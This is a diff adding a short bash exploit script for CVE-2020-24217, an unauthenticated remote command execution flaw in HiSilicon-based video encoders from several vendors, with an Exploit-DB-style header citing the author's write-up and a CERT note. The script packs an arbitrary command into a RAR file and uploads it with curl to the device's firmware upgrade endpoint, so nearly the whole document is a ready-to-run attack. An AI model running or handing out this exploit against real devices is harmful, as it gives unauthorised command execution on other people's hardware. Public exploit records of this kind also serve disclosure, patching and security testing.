@@ -1,0 +1,35 @@
+#!/usr/bin/env bash
+
+# Exploit Title: HiSilicon video encoders - RCE via unauthenticated upload of malicious firmware
+# Date: 2020-09-20
+# Exploit Author: Alexei Kojenov
+# Vendor Homepage: multiple vendors
+# Software Link: N/A
+# Version: vendor-specific
+# Tested on: Linux
+# CVE: CVE-2020-24217
+# Vendors: URayTech, J-Tech Digital, ProVideoInstruments
+# Reference: https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/
+# Reference: https://www.kb.cert.org/vuls/id/896979
+
+
+if [ "$#" -ne 2 ]
+then
+  echo "Usage:   $0 <server>[:<port>] <command>"
+  exit 1
+fi
+
+printf "creating uk.rar... "
+echo "$2" > uk.txt
+rar a -ma4 uk.rar uk.txt >/dev/null 2>&1 || { echo "ERROR: rar failed. Is it installed?"; exit 2; }
+echo "done"
+rm uk.txt
+
+printf "uploading the RAR file... "
+if curl -s -F 'upgrade=@uk.rar' http://$1 >/dev/null
+then
+  echo "SUCCESS: remote command executed"
+  rm uk.rar
+else
+  echo "ERROR: $?"
+fi
